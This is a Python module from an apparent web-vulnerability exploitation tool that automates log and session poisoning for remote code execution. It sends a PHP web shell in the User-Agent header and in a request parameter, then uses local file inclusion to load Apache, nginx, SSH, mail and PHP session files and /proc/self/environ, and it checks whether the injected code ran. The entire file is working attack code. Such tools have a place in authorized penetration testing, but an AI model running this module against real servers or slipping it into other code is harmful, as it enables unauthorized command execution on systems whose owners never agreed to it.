"""Log / session poisoning — two-phase RCE technique.

INJECT phase: send a request with a web shell in a field that ends up in
              a log (User-Agent -> access.log) or a session file (?param -> sess_*).
INCLUDE phase: include that log/session via LFI and trigger the code (marker).

Requires the application to have read access to the given log (server-dependent).
"""
from __future__ import annotations

from collections.abc import Iterator

from ..config import Encoding
from ..detection import Finding, RCE_MARKER
from ..http_client import HttpClient
from .base import BaseModule

_WEBSHELL = f"<?php system('echo {RCE_MARKER}; id'); ?>"

# Candidate logs to include (Linux + Windows).
_LOG_PATHS = [
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/httpd/access_log",
    "/var/log/sshd.log", "/var/log/auth.log",
    "/var/log/mail", "/var/log/vsftpd.log",
    "/proc/self/environ", "/proc/self/fd/8", "/proc/self/fd/9",
    "C:/xampp/apache/logs/access.log", "C:/nginx/log/access.log",
]

# Base PHP session directories (filename: sess_<PHPSESSID>).
_SESSION_DIRS = ["/var/lib/php/sessions/", "C:/Windows/Temp/"]


class LogPoisonModule(BaseModule):
    name = "log_poison"
    description = "Log/session poisoning — INJECT web shell, then INCLUDE (2 phases)"
    verifiable = False  # custom run(): needs the INJECT phase replayed too

    def payloads(self) -> Iterator[str]:
        # Base interface unused — this module has its own two-phase run().
        yield from ()

    async def run(self, client: HttpClient) -> list[Finding]:
        findings: list[Finding] = []

        # --- INJECT PHASE: poison access.log via the User-Agent header ---
        await client.send(
            "/",  # any request; what matters is the header landing in the log
            encoding=Encoding.NONE,
            extra_headers={"User-Agent": _WEBSHELL},
        )

        # --- INCLUDE PHASE: include each candidate log and check for the marker ---
        for log in self._candidate_logs():
            resp = await client.send(log, encoding=Encoding.NONE)
            if self.cfg.verbose:
                print(f"    [{resp.status}] {resp.length:>7}B  include {log}")
            f = self.evaluate(resp)
            if f.confirmed:
                findings.append(f)

        # --- SESSION POISONING: poison ?param, then include the session file ---
        sessid = client.cfg.cookies.get("PHPSESSID")
        if sessid:
            await client.send(_WEBSHELL, encoding=Encoding.URL)  # gets saved into the session
            for d in _SESSION_DIRS:
                sess_path = f"{d}sess_{sessid}"
                resp = await client.send(sess_path, encoding=Encoding.NONE)
                if self.cfg.verbose:
                    print(f"    [{resp.status}] {resp.length:>7}B  include {sess_path}")
                f = self.evaluate(resp)
                if f.confirmed:
                    findings.append(f)

        return self.dedup(findings)

    def _candidate_logs(self) -> list[str]:
        if self.cfg.target_file:
            return [self.cfg.target_file]
        return _LOG_PATHS
